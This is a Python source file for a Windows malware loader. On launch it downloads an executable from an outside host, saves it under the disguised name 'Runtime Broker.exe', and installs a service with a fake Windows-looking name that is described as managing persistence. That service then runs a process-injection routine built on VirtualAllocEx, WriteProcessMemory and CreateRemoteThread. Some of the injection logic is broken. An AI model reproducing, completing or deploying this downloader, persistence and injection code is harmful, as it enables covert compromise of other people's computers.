import os
import sys
import win32serviceutil
import win32service
import win32event
import servicemanager
import ctypes
import tempfile
import urllib

url = "http://dumbledoor.x10.mx/snape.exe"
file_path = tempfile.gettempdir() + "/Runtime Broker.exe"
#http://dumbledoor.x10.mx/snape.exe
os.chdir(tempfile.gettempdir())
urllib.request.urlretrieve(url, file_path)


class MyService(win32serviceutil.ServiceFramework):
    _svc_name_ = "WindowsConnectionManager"
    _svc_display_name_ = "Windows Connection Manager"
    _svc_description_ = "Manages Persistence for outgoing connections of Prof. Snape"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.stop_event = win32event.CreateEvent(None, 0, 0, None)

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.stop_event)

    def SvcDoRun(self):
        self.ReportServiceStatus(win32service.SERVICE_RUNNING)
        dll_path = get_kernel32_path()
        exe_path = "Runtime Broker.exe" # replace with your actual path
        with open(exe_path, "rb") as f:
            payload = f.read()
        inject_dll(dll_path, payload)

        # wait for stop signal, but check every second for stop requests
        rc = win32event.WaitForSingleObject(self.stop_event, 1000)
        while rc == win32event.WAIT_TIMEOUT:
            rc = win32event.WaitForSingleObject(self.stop_event, 1000)
        
        self.ReportServiceStatus(win32service.SERVICE_STOPPED)

def get_kernel32_path():
    kernel32_32bit = "C:\\Windows\\System32\\kernel32.dll"
    kernel32_64bit = "C:\\Windows\\SysWOW64\\kernel32.dll"

    if os.path.exists(kernel32_32bit):
        dll_path = kernel32_32bit
    elif os.path.exists(kernel32_64bit):
        dll_path = kernel32_64bit
    else:
        print("Could not find kernel32.dll")
        sys.exit(1)
    return dll_path

def inject_dll(dll_path, payload):
    # open handle to target process
    pid = ctypes.windll.kernel32.GetCurrentProcessId()
    handle = ctypes.windll.kernel32.OpenProcess(
        ctypes.c_uint(0x1F0FFF), ctypes.c_int(0), pid)

    # allocate memory for payload
    size = len(payload)
    mem = ctypes.windll.kernel32.VirtualAllocEx(
        handle, None, size, 0x1000, 0x40)

    # write payload to memory
    ctypes.windll.kernel32.WriteProcessMemory(
        handle, mem, payload, size, None)

    # get address of LoadLibraryA function
    kernel32 = ctypes.windll.kernel32
    loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryA")

    # create remote thread to execute payload
    thread_id = ctypes.c_ulong()
    ctypes.windll.kernel32.CreateRemoteThread(
        handle, None, 0, loadlib, mem, 0, ctypes.byref(thread_id))

    # wait for thread to finish
    ctypes.windll.kernel32.WaitForSingleObject(thread_id, -1)

    # free memory and close handle
    ctypes.windll.kernel32.VirtualFreeEx(handle, mem, size, 0x8000)
    ctypes.windll.kernel32.CloseHandle(handle)

if __name__ == '__main__':
    servicemanager.Initialize()
    servicemanager.PrepareToHostSingle(MyService)
    win32serviceutil.HandleCommandLine(MyService)
